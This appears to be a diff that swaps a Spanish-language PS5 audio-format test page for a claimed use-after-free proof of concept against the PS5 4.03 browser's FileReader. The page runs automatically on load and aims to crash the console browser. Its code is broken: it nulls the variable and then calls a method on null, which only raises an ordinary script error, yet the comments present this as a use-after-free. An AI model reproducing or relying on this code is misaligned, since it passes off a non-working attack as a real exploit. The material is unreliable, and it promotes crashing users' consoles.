@@ -1,25 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Test ALAC PS5</title>
-  <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 2em; }
-    #log { white-space: pre-wrap; }
-  </style>
+    <title>PoC Use-After-Free FileReader PS5 4.03</title>
 </head>
 <body>
-  <h2>Verificación de ALAC en PS5</h2>
-  <audio id="player" src="corrupted.m4a" controls autoplay></audio>
-  <div id="log">Cargando audio...</div>
+    <h1>PoC Use-After-Free FileReader</h1>
+    <p>Si la consola es vulnerable, el navegador se bloqueará o mostrará comportamiento errático.</p>
 
-  <script>
-    const log = (msg) => {
-      document.getElementById("log").textContent += "\n" + msg;
-    };
+    <script>
+    // Crea un objeto FileReader
+    let fr;
 
-    const player = document.getElementById("player");
-    player.oncanplay = () => log("✅ Puede reproducirse (ALAC soportado)");
-    player.onerror = () => log("❌ Error al reproducir (archivo rechazado o crash)");
-  </script>
+    function triggerUseAfterFree() {
+        try {
+            // Crear un blob pequeño
+            let blob = new Blob(["Exploit"], { type: "text/plain" });
+
+            fr = new FileReader();
+
+            // Listener de evento 'loadend'
+            fr.onloadend = function() {
+                // Intenta usar el FileReader después de liberado
+                // Aquí forzamos read para que se libere y luego otra llamada que puede fallar
+                try {
+                    fr.readAsText(blob);  // Lee el blob (normal)
+                } catch(e) {
+                    console.log("Error segunda lectura:", e);
+                }
+            };
+
+            // Primer read para iniciar el proceso
+            fr.readAsText(blob);
+
+            // Liberar referencia y forzar GC para potencial uso posterior
+            fr = null;
+
+            // Forzamos a que se recolecte basura (no garantiza)
+            if (window.gc) window.gc();
+
+            // Volver a llamar con delay para usar objeto ya liberado
+            setTimeout(() => {
+                try {
+                    fr.readAsText(blob);  // Intento agresivo que debe fallar si está liberado
+                } catch(e) {
+                    console.log("Intento de use-after-free capturado:", e);
+                }
+            }, 100);
+        } catch (ex) {
+            console.error("Error general:", ex);
+        }
+    }
+
+    // Ejecutar el trigger al cargar
+    window.onload = triggerUseAfterFree;
+    </script>
 </body>
 </html>
